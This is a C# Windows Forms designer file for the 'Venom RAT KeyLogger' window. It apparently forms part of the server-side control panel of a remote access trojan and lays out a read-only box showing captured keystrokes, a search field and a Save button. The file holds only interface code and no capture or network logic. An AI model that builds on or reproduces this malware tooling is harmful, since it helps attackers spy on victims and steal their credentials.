namespace VenomRAT_HVNC.Server.Forms
{
	public partial class FormKeylogger : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.Server.Forms.FormKeylogger));
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.toolStrip1 = new global::System.Windows.Forms.ToolStrip();
			this.toolStripLabel1 = new global::System.Windows.Forms.ToolStripLabel();
			this.toolStripTextBox1 = new global::System.Windows.Forms.ToolStripTextBox();
			this.toolStripSeparator1 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripButton1 = new global::System.Windows.Forms.ToolStripButton();
			this.richTextBox1 = new global::System.Windows.Forms.RichTextBox();
			this.guna2DragControl1 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.guna2Panel1 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.label1 = new global::System.Windows.Forms.Label();
			this.guna2Separator1 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2Separator2 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.toolStrip1.SuspendLayout();
			this.guna2Panel1.SuspendLayout();
			base.SuspendLayout();
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.Timer1_Tick);
			this.toolStrip1.BackColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.toolStrip1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.toolStrip1.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.toolStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.toolStripLabel1, this.toolStripTextBox1, this.toolStripSeparator1, this.toolStripButton1 });
			this.toolStrip1.Location = new global::System.Drawing.Point(0, 434);
			this.toolStrip1.Name = "toolStrip1";
			this.toolStrip1.Size = new global::System.Drawing.Size(774, 25);
			this.toolStrip1.TabIndex = 0;
			this.toolStrip1.Text = "toolStrip1";
			this.toolStripLabel1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.toolStripLabel1.Name = "toolStripLabel1";
			this.toolStripLabel1.Size = new global::System.Drawing.Size(42, 22);
			this.toolStripLabel1.Text = "Search";
			this.toolStripTextBox1.BackColor = global::System.Drawing.Color.FromArgb(39, 39, 39);
			this.toolStripTextBox1.Font = new global::System.Drawing.Font("Microsoft YaHei UI", 9f);
			this.toolStripTextBox1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.toolStripTextBox1.Name = "toolStripTextBox1";
			this.toolStripTextBox1.Size = new global::System.Drawing.Size(68, 25);
			this.toolStripTextBox1.Text = "...";
			this.toolStripTextBox1.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.ToolStripTextBox1_KeyDown);
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new global::System.Drawing.Size(6, 25);
			this.toolStripButton1.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			this.toolStripButton1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.toolStripButton1.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButton1.Image")));
			this.toolStripButton1.ImageTransparentColor = global::System.Drawing.Color.Magenta;
			this.toolStripButton1.Name = "toolStripButton1";
			this.toolStripButton1.Size = new global::System.Drawing.Size(35, 22);
			this.toolStripButton1.Text = "Save";
			this.toolStripButton1.Click += new global::System.EventHandler(this.ToolStripButton1_Click);
			this.richTextBox1.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.richTextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.richTextBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.richTextBox1.ForeColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.richTextBox1.Location = new global::System.Drawing.Point(0, 51);
			this.richTextBox1.Margin = new global::System.Windows.Forms.Padding(2);
			this.richTextBox1.Name = "richTextBox1";
			this.richTextBox1.ReadOnly = true;
			this.richTextBox1.Size = new global::System.Drawing.Size(774, 381);
			this.richTextBox1.TabIndex = 1;
			this.richTextBox1.Text = "";
			this.guna2DragControl1.TargetControl = this.guna2Panel1;
			this.guna2Panel1.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2Panel1.Controls.Add(this.label1);
			this.guna2Panel1.Controls.Add(this.guna2Separator1);
			this.guna2Panel1.Controls.Add(this.guna2Separator2);
			this.guna2Panel1.Controls.Add(this.guna2ControlBox1);
			this.guna2Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.guna2Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.guna2Panel1.Name = "guna2Panel1";
			this.guna2Panel1.ShadowDecoration.Parent = this.guna2Panel1;
			this.guna2Panel1.Size = new global::System.Drawing.Size(774, 52);
			this.guna2Panel1.TabIndex = 2;
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.White;
			this.label1.Location = new global::System.Drawing.Point(2, 12);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(176, 20);
			this.label1.TabIndex = 131;
			this.label1.Text = "Venom RAT KeyLogger";
			this.guna2Separator1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2Separator1.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator1.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator1.FillThickness = 2;
			this.guna2Separator1.Location = new global::System.Drawing.Point(0, 42);
			this.guna2Separator1.Name = "guna2Separator1";
			this.guna2Separator1.Size = new global::System.Drawing.Size(774, 10);
			this.guna2Separator1.TabIndex = 130;
			this.guna2Separator2.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2Separator2.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator2.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator2.FillThickness = 2;
			this.guna2Separator2.Location = new global::System.Drawing.Point(0, -3);
			this.guna2Separator2.Name = "guna2Separator2";
			this.guna2Separator2.Size = new global::System.Drawing.Size(774, 10);
			this.guna2Separator2.TabIndex = 130;
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(730, 8);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(41, 32);
			this.guna2ControlBox1.TabIndex = 13;
			this.guna2BorderlessForm1.AnimateWindow = true;
			this.guna2BorderlessForm1.AnimationType = global::Guna.UI2.WinForms.Guna2BorderlessForm.AnimateWindowType.AW_HOR_NEGATIVE;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(39, 39, 39);
			base.ClientSize = new global::System.Drawing.Size(774, 459);
			base.Controls.Add(this.guna2Panel1);
			base.Controls.Add(this.richTextBox1);
			base.Controls.Add(this.toolStrip1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "FormKeylogger";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Keylogger";
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.Keylogger_FormClosed);
			this.toolStrip1.ResumeLayout(false);
			this.toolStrip1.PerformLayout();
			this.guna2Panel1.ResumeLayout(false);
			this.guna2Panel1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		private global::System.ComponentModel.IContainer components;

		private global::System.Windows.Forms.ToolStrip toolStrip1;

		private global::System.Windows.Forms.ToolStripLabel toolStripLabel1;

		private global::System.Windows.Forms.ToolStripTextBox toolStripTextBox1;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator1;

		private global::System.Windows.Forms.ToolStripButton toolStripButton1;

		public global::System.Windows.Forms.RichTextBox richTextBox1;

		public global::System.Windows.Forms.Timer timer1;

		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl1;

		private global::Guna.UI2.WinForms.Guna2Panel guna2Panel1;

		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator1;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator2;

		private global::System.Windows.Forms.Label label1;

		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;
	}
}
